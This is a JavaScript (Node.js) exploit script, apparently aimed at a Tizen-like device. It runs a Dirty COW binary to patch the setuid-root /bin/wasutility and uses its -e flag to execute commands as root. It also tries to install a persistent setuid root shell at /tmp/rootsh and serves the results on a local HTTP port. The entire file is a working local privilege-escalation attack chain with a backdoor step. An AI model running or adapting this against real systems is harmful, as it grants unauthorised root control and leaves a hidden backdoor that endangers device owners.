// v25 - Dirty COW wasutility parent-check bypass -> LPE
// 1. chmod +x dirtycow_was (in case sdb push dropped execute bit)
// 2. Run dirtycow_was: patches /bin/wasutility page cache (d0->e0 at 0x7e4b)
// 3. Run /bin/wasutility (setuid root) with -e flag to exec as root
// Pull server: 8104
try {
  var fs  = require('fs');
  var cp  = require('child_process');
  var http = require('http');
  var lines = ['=== dirtycow-lpe v25 ==='];

  var DCOW = '/home/owner/share/tmp/sdk_tools/dirtycow_was';
  var OUT  = '/home/owner/share/tmp/sdk_tools/pwn_result.txt';

  // Step 1: chmod +x
  try {
    fs.chmodSync(DCOW, 0755);
    lines.push('chmod: OK');
  } catch(e) { lines.push('chmod: ' + String(e.message||e)); }

  // Step 2: verify file exists and size
  try {
    var st = fs.statSync(DCOW);
    lines.push('dirtycow_was: ' + st.size + ' bytes mode=0' + st.mode.toString(8));
  } catch(e) { lines.push('stat: ' + String(e.message||e)); }

  // Step 3: exec test - can we run native binaries at all?
  var execErr = null;
  var dcowOut = '';
  try {
    dcowOut = cp.execSync(DCOW, {timeout: 30000}).toString().trim();
    lines.push('dirtycow_run: OK');
    lines.push('dirtycow_out: ' + dcowOut.substring(0, 200));
  } catch(e) {
    execErr = String(e.message||e).substring(0, 200);
    lines.push('dirtycow_run: FAILED: ' + execErr);
    if (e.stdout) lines.push('dirtycow_stdout: ' + e.stdout.toString().substring(0, 200));
    if (e.stderr) lines.push('dirtycow_stderr: ' + e.stderr.toString().substring(0, 200));
  }

  // Step 4: Try wasutility without args to see usage/error
  var wuNoArgs = '';
  try {
    wuNoArgs = cp.execSync('/bin/wasutility 2>&1', {timeout: 5000}).toString().trim();
  } catch(e) {
    wuNoArgs = 'exit ' + (e.status||'?') + ': ' + String(e.stderr||e.stdout||e.message||'').substring(0, 100);
  }
  lines.push('wasutility_noargs: ' + wuNoArgs.substring(0, 150));

  // Step 5: Try wasutility -e with a simple command (write id to file)
  var wuCmd = '/bin/wasutility -e "id > ' + OUT + '"';
  var wuOut = '';
  try {
    wuOut = cp.execSync(wuCmd, {timeout: 10000}).toString().trim();
    lines.push('wasutility_e: OK out=' + wuOut.substring(0, 100));
  } catch(e) {
    wuOut = 'exit ' + (e.status||'?') + ': ' + String(e.stderr||e.stdout||e.message||'').substring(0, 100);
    lines.push('wasutility_e: ' + wuOut);
  }

  // Step 6: Read result file if it was written
  try {
    var pwnResult = fs.readFileSync(OUT, 'utf8').trim();
    lines.push('pwn_result: ' + pwnResult);
    if (pwnResult.indexOf('uid=0') !== -1) lines.push('=== ROOTED ===');
  } catch(e) { lines.push('pwn_result: not found (' + String(e.code||e.message) + ')'); }

  // Step 7: Also try wasutility -e with exec to get a persistent shell
  // Write a setuid shell: cp /bin/sh /tmp/rootsh && chmod 4755 /tmp/rootsh
  var wuShCmd = '/bin/wasutility -e "cp /bin/sh /tmp/rootsh && chmod 4755 /tmp/rootsh"';
  try {
    cp.execSync(wuShCmd, {timeout: 10000});
    lines.push('rootsh_install: attempted');
    var rootshSt = fs.statSync('/tmp/rootsh');
    lines.push('rootsh_mode: 0' + rootshSt.mode.toString(8));
    if ((rootshSt.mode & 0xfff) === 0o4755) lines.push('rootsh: SETUID OK');
  } catch(e) {
    lines.push('rootsh: ' + String(e.message||e.code||'').substring(0, 100));
  }

  var body = lines.join('\n') + '\n=== END ===\n';
  try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe25.txt', body); } catch(e3) {}
  var srv = http.createServer(function(req, res) {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end(body);
  });
  srv.listen(8104, '127.0.0.1', function() {});
  srv.on('error', function(e) {});
  setInterval(function() {}, 60000);
} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe25-crash.txt', String(e.stack||e.message).substring(0, 500)); } catch(e2) {}
}
